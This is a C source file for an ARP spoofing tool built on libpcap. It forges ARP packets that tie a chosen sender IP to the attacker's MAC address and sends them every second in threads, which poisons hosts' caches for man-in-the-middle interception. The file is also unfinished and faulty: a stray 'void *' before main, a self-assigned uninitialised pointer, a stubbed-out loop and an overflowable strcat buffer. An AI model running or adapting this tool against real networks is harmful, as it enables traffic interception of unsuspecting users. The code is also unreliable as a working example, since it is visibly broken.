#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>
#include <pthread.h>

#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
// #include <netinet/if_ether.h>
/*
 * netinet/ether.h
 * 		- ether_ntoa()
 * #include <netinet/if_ether.h>
 * #include <linux/if_ether.h>
 * #include <net/ethernet.h>
 *		- struct ether_header
 *		- struct ether_addr
 *		- define ETHERTYPE_ARP = 0x0806
 * 		- define ETHER_ADDR_LEN = 6
 * #include <net/if_arp.h>
 *		- struct ether_arp
 *		- define ARPHRD_ETHER 1
 *		- define ARPOP_REQUEST 1
 */

#define IP_ARRD_LEN 4
struct arp_list_s
{
	uint8_t sip[IP_ARRD_LEN];
	uint8_t tip[IP_ARRD_LEN];
	uint8_t sha[ETHER_ADDR_LEN];
	uint8_t tha[ETHER_ADDR_LEN];
};

struct arp_thread_arg_s
{
	pcap_t *handle;         /* Session handle */
	u_char *packet;
};



const unsigned char *kStringSysClassNet = "/sys/class/net/";
const unsigned char *kStringAddress = "/address";
void get_mac_address(uint8_t *_mac_addr, int8_t *_dev)
{
	int i;
	FILE *fp = NULL;
	int8_t buf[50] = {'\0', };

	strcat(buf, kStringSysClassNet);
	strcat(buf, _dev);
	strcat(buf, kStringAddress);
	if( NULL == (fp = fopen(buf, "r")))
	{
		fprintf(stderr, "can't read %s\n", _dev);
		exit(-1);
	}

	uint8_t str_mac_address[ETHER_ADDR_LEN * 3] = {'\0', };


	fgets(str_mac_address, ETHER_ADDR_LEN * 3, fp);
	for (i=0; i<ETHER_ADDR_LEN; i++)
		_mac_addr[i] = strtol(&str_mac_address[i*3], NULL, 16);
	fclose(fp);
}


void print_ether_info(struct ether_header *_eth_hdr)
{
	printf("## ether info\n");
	printf("dst mac : %s\n", ether_ntoa((struct ether_addr *)_eth_hdr->ether_dhost));
	printf("src mac : %s\n", ether_ntoa((struct ether_addr *)_eth_hdr->ether_shost));
	printf("type	: %02X\n", _eth_hdr->ether_type);
}


void print_arp_info(struct ether_arp *_arp_hdr)
{
	uint8_t ip_addr_buf[20] = {'\0', };
	printf("## arp info\n");
	printf("hw type        : %d\n", htons(_arp_hdr->ea_hdr.ar_hrd));
	printf("proto type     : %d\n", htons(_arp_hdr->ea_hdr.ar_pro));
	printf("hw addr len    : %d\n", _arp_hdr->ea_hdr.ar_hln);
	printf("proto addr len : %d\n", _arp_hdr->ea_hdr.ar_pln);
	printf("opt            : %d\n", htons(_arp_hdr->ea_hdr.ar_op));
	printf("sender mac     : %s\n", ether_ntoa((struct ether_addr *)_arp_hdr->arp_sha));
	inet_ntop(AF_INET, _arp_hdr->arp_spa, ip_addr_buf, sizeof(ip_addr_buf));
	printf("sender ip      : %s\n", ip_addr_buf);
	printf("target mac     : %s\n", ether_ntoa((struct ether_addr *)_arp_hdr->arp_tha));
	inet_ntop(AF_INET, _arp_hdr->arp_tpa, ip_addr_buf, sizeof(ip_addr_buf));
	printf("target ip      : %s\n", ip_addr_buf);
	
}


/*
 * ether header size: 14 byte
 * ether dst host	:  6 byte
 * ether src host	:  6 byte
 * ether type		:  2 byte
 *
 * arp header size	: 28 byte
 * hardware type	:  2 byte
 * Protocol type	:  2 byte
 * hw addr length	:  1 byte
 * proto addr length:  1 byte
 * opt				:  2 byte	// 1: requset, 2: reply
 * sender mac		:  6 byte
 * sender ip		:  4 byte
 * target mac		:  6 byte
 * target ip		:  4 byte
 */
uint8_t *create_arp_packet(uint8_t *_sip, uint8_t *_tip, uint8_t *_sha, uint8_t *_tha)
{
	struct ether_header *eth_hdr = NULL;
	struct ether_arp *arp_hdr = NULL;
	uint8_t ip_addr_buf[20] = {'\0', };
	uint8_t *packet = (uint8_t *) malloc (sizeof(struct ether_header) + sizeof(struct ether_arp));

	// initialize ether header.
	eth_hdr = (struct ether_header *) packet;
	memcpy(eth_hdr->ether_dhost, _tha, ETHER_ADDR_LEN);
	memcpy(eth_hdr->ether_shost, _sha, ETHER_ADDR_LEN);
	eth_hdr->ether_type = htons(ETHERTYPE_ARP);

	// initialize arp header.
	arp_hdr = (struct ether_arp *) (packet+sizeof(struct ether_header));
	arp_hdr->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp_hdr->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
	arp_hdr->ea_hdr.ar_hln = ETHER_ADDR_LEN;
	arp_hdr->ea_hdr.ar_pln = 4;
	arp_hdr->ea_hdr.ar_op = htons(ARPOP_REQUEST);

	memcpy(arp_hdr->arp_sha, _sha, ETHER_ADDR_LEN);
	memcpy(arp_hdr->arp_spa, _sip, 4);

	memcpy(arp_hdr->arp_tha, _tha, ETHER_ADDR_LEN);
	memcpy(arp_hdr->arp_tpa, _tip, 4);


	return packet;
}


/*
 * arp poisoning every second.
 *
 * int pcap_sendpacket(pcap_t *p, uint8_t *buf, int size)
 *
 * If the packet is successly sent, return 0.
 * otherwise, return -1.
 */
void *arp_poisoning(void *_arp)
{
	struct arp_thread_arg_s *arp = _arp;
	int arp_len = sizeof(struct ether_header) + sizeof(struct ether_arp);

	while(1)
	{
		if(0 != pcap_sendpacket(arp->handle, arp->packet, arp_len))
			continue;
		sleep(1);
		// print arp packet information.
		struct ether_header *eth_hdr = (struct ether_header *) arp->packet;
		struct ether_arp *arp_hdr = (struct ether_arp *) (arp->packet + sizeof(struct ether_header));
		printf("########## send arp packet info ##########\n");	
		print_ether_info(eth_hdr);
		print_arp_info(arp_hdr);
		printf("\n");
	}
}

void *

/*
 * argv[1] : dev
 * argv[2] : source ip
 * argv[3] : target ip
 */
int main(int argc, int8_t *argv[])
{
	pcap_t *handle;         /* Session handle */
	struct pcap_pkthdr *header; /* The header that pcap gives us */
	int8_t errbuf[PCAP_ERRBUF_SIZE];
	const uint8_t *packet;       /* The actual packet */


	// check input format.
	if( (argc < 4) || (0 != argc % 2) )
	{
		printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
		return -1;
	}

	/*
	 * pcap_open_live parameter(dev, len, promisc, ms, errbuf)
	 * 	- dev    : name of the device
	 * 	- len    : portion of the packet to capture (only the first 100 bytes)
	 * 	- promisc: promiscuous mode
	 * 	- ms     : read timeout
	 * 	- errbuf : error buffer
	 */
	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	//  *handle = pcap_open_live("awdl0", BUFSIZ, 1, 1000, errbuf); // dump
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
		return -1;
	}



	int i, re, arp_list_len;
	pthread_t *arp_poisoning_thread;
	struct arp_list_s *arp_list;
	struct arp_thread_arg_s *arp_thr_arg;

	// create arp packet and arp poisoning using thread.
	/*
	 * int pthread_create(*id, *attr, *(*start_routine)(void *), *arg);
	 *  - thread  : thread.
	 *  - attr	  : attribute of thread.
	 *  - routine : function which thread execute.
	 *  - arg	  : function argument.
	 */
	arp_list_len = (argc >> 1) - 1;			// set arp list cnt.
	arp_list = (struct arp_list_s *) malloc (arp_list_len * sizeof(struct arp_list_s));
	arp_thr_arg = (struct arp_thread_arg_s *) malloc (arp_list_len * sizeof(struct arp_thread_arg_s));
	arp_poisoning_thread = (pthread_t *) malloc (arp_list_len * sizeof(pthread_t));
	for(i=0; i<arp_list_len; i++)
	{
		get_mac_address(arp_list[i].sha, argv[1]);			// set sender hardware address.
		memset(arp_list[i].tha, 0xff, ETHER_ADDR_LEN);		// set target hardware address.
		// set sender IP address.
		if( 1 != inet_pton(AF_INET, argv[i*2+2], arp_list[i].sip) )
		{
			printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
			return 0;
		}
		// set target IP address.
		if( 1 != inet_pton(AF_INET, argv[i*2+3], arp_list[i].tip) )
		{
			printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
			return 0;
		}

		// create thread and run 'arp poisoning'.
		arp_thr_arg[i].handle = handle;
		arp_thr_arg[i].packet = create_arp_packet(arp_list[i].sip, arp_list[i].tip, arp_list[i].sha, arp_list[i].tha);
		if( 0 > (re = pthread_create(&arp_poisoning_thread[i], NULL, arp_poisoning, (void *)&arp_thr_arg[i])) )
		{
			fprintf(stderr, "thread create error\n");
			return -1;
		}
	}


	struct ether_header *eth_hdr;
	struct ether_arp *arp_hdr;
	// get target mac address through arp reply.
	while( 0 <= (re = pcap_next_ex(handle, &header, &packet)) )
	{
		if( 0 == re)
			continue;

		eth_hdr = (struct ether_header *) eth_hdr;
		if( ETHERTYPE_ARP == (ntohs(eth_hdr->ether_type) & 0x0000ffff))
		{
			for(i=0; i<arp_list_len; i++)
			{
				// ....
			}
		}
	}



	// 
	while( 0 <= (re = pcap_next_ex(handle, &header, &packet)) )
	{
		if( 0 == re )
			continue;

		struct ether_header *eth_hdr = (struct ether_header *) packet;
		switch((ntohs(eth_hdr->ether_type) & 0x0000ffff))
		{
			case ETHERTYPE_ARP:
				{
					struct ether_arp *arp_hdr = (struct ether_arp *)(packet + sizeof(struct ether_header));

					// print arp packet infomation.
					printf("########## receive arp packet ##########\n");	
					print_ether_info(eth_hdr);
					print_arp_info(arp_hdr);
					printf("\n");
					break;
				}
			default:
				{
					break;
				}
		}
	}

	pcap_close(handle);


	return(0);
}
